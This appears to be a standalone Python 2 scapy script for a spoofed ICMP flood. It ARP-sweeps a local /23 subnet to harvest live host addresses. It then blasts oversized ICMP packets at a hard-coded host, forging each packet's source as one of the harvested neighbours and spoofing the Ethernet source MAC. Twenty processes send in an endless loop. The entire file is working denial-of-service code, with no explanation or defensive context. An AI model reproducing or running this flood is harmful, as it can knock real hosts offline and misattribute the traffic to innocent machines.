import os
import sys
import random
from multiprocessing import Process, Pool
from scapy.all import *

ether_pkt = None
ip_pkt = None
ip_addr = []

def send_packets():
	global ip_pkt
	global ether_pkt
	global ip_addr
	
	ip_pkt.src = random.choice(ip_addr)
	send_packet = ether_pkt/ip_pkt
	sendp(send_packet, inter=0, count=500)

	return 

def input_details():
	global ip_pkt
	global ether_pkt
	global ip_addr

	# subnet_addr = raw_input("Enter subnet address (192.168.1.0/24) :- ")
	# dst_ip = raw_input("Enter destination ip :- ")

	# ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=subnet_addr),timeout=2)
	ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="172.16.0.0/23"),timeout=2)
	
	ans.summary(lambda(sender,receiver): ip_addr.append(sender.pdst))

	ether_pkt = Ether()
	ether_pkt.src = "00:00:01:02:05:05"
	ether_pkt.display()

	payload = "X"*1450
	ip_pkt = IP()/ICMP()/payload
	# ip_pkt.dst = dst_ip
	ip_pkt.dst = "172.16.0.51"

def main():
	input_details()

	pool = Pool(processes=20)

	while True:
		pool.apply_async(send_packets)

if __name__ == '__main__':
	main()